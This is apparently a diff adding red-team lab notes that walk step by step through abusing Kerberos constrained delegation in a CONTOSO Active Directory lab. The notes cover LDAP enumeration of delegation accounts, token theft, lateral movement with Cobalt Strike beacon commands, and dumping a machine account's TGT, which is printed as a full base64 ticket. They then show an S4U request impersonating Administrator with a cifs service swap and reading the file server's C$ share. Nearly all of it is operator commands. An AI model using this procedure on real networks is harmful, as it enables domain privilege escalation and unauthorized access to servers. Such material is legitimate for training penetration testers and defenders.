@@ -1,0 +1,34 @@
+use LDAP to find users with constrained delegation (where the AllowedToDelegateTo attribute is not null)
+    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+
+we see LON-WS-1$ is AllowedToDelegateTo to time service on lon-fs-1 and has a non-default UAC value
+check that the TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
+    powershell> [Convert]::ToBoolean(16781312 -band 16777216)
+
+we verify that protocol transition is enabled
+
+move laterally to the web server
+    steal token from rsteel
+    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+    beacon> jump scshell64 lon-ws-1 smb
+
+now interact with the web server beacon and enumerate the krbtgt ticket for lon-ws-1
+    beacon> krb_dump luid:3e7 /service:krbtgt
+
+copy the ticket and store for later
+	doIFnjCCBZqgAwIBBaEDAgEWooIEpTCCBKFhggSdMIIEmaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBF8wggRboAMCARKhAwIBAqKCBE0EggRJDlHBcn6pK+kbKLUPpWJhLZ0XJfi1M/S+g/XKFkSHTUYSBOIqQ284cwxaga8hHJeQUwu0nwfG4jP0e5l7jrylGTSQRDYxo5WCpUTMDQUrJnFYqKkqwZBJiQQ24S+INvIV/IFz8Dy6mGonksqASWCskKn/laG797sfUkvWc/srFq8G2UmkDougl0HLaExB1zB4WSR4V8SyJcltlP4ZHr8Tz4U2gG1ZKO4VQGHH35L23Vyhphpz4rVAvTfMj4O8XQsqGBg87syyZQwvAvYxQOt5Z8ni3pv5qQ3zV5UqzVnaFOtPPZlEpaeePcRY4y3RFHTg/OSYfbRq6jjU60kBh5S/ykwqwtLB0QGeSaaZQ/A/9r/Tpt/x/+ib3vA7hDqsCXe5nbXAMrxi01GrZi3Nw+wFNl5+FqsVqaO0pn2dKXs6xlUjBO4/77nxrp4og2oYiSAsr2v2Zi5ejmPAgTTvN2+A2F0xvdoyz6m+VbXkHlAyYqM3uGIGzUHw8LSxsJOk1mw3m/HekjsZLtSLJFXEO76bQ6HeyKw41yYwlH77wQIazp5HA8RnKjtYTCD4MslcHg4eoGe1mGM76jeX0AsC5f3Yq+F7Xucma4mWx9DtEprgQre7Kgy+A49PBspqWSVwTjHafnCAsCfcOr4UB4IO3o4sGFRtH+Hn2Ze602Q3JWopDyR2uozYcfVc2XBae7xCqzIF9ZCSy10nWFih8KjQOY9BcSXdNBjT0X0gUtdIY1c25Ekpy0j6aw3N3OBltAhyg9RyE9josI4ws0c/E2D7o9yf8yMzGk2NFDw9LS6VJApxRNCiAT12cs1qXRWdwqC4IuktO1hZJm47qw80UsRarnuHxl/b4L3nwy7Z6oBtRWlAGyiVLJaXLKMiaIzccaRRvFf6yNv44T5wlmLNlUOoLOZcaWeDNqYBAGrkD1ReJpGdUSRRTw1GI6zC1wEUmtFf5oXMpaySdQDR9aF2dmASCFPWhFZLRiHqiRJP4SL4uCUskYOUauSwDlWTFbaPhLf+/4eN0BsLqVsySY/LrbrA0YauIjZz0tKExJEg4WzxAHDonDjBjS+LRFIxcUEboDtq7wJxx30kPJTaQbRqFZjE6WayrTPu2LmeRZ/X+LBdAlB4vIs08s9JNo324rx+8aamlWWOrRijCHbfJwIL3p9NnQugxB1odwW0/1QUt7GkoZfqt0eoEW7SDhDvLDpeQIxBPGN9V3wS6hO4w9GG/GskoaeZ0vpjqFWUfmRSpcA7/INl3b5Rn39REJ2Xbm5k/KhSoeN69cGnYaF4rw55U+ackoSubBn1MstPKUoBSUmAPaQ7cA2aL2Pfz15fy1aRFCS+J+9fQS2V1kwvlQ+RVxYAJu2azWAg7rjHudb9TU690tZ+S1XXcKVgiKArobyNzS7+ROpanS0thylcTzvjt+UW9cJUDim7AdPXsu4xc4lDFC9H5IqI7C3ZDlqXiWujgeQwgeGgAwIBAKKB2QSB1n2B0zCB0KCBzTCByjCBx6ArMCmgAwIBEqEiBCBlzas28NIluT2EgXZtjdmEq6dASJyQ0hYY5dzYQNdMYaENGwtDT05UT1NPLkNPTaIWMBSgAwIBAaENMAsbCUxPTi1XUy0xJKMHAwUAQOEAAKURGA8yMDI2MDQxNTIxMTE1MlqmERgPMjAyNjA0MTYwNzExNTJapxEYDzIwMjYwNDIyMjExMTUyWqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00=        
+    NOTE: store to kirbi file with powershell> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\time.kirbi", [Convert]::FromBase64String("[ticket]"))
+
+now perform the attack!
+    beacon> krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
+
+krb_describe /ticket:[returned ticket]
+we can see the service name is cifs/lon-fs-1 with user Administrator!
+
+now we use the ticket to interact with the file server!
+    beacon> ls \\lon-fs-1\c$\
+        verify we cannot read from it 
+    beacon> make_token CONTOSO\Administrator FakePass
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\time.kirbi
+    beacon> ls \\lon-fs-1\c$\
+        now we can!
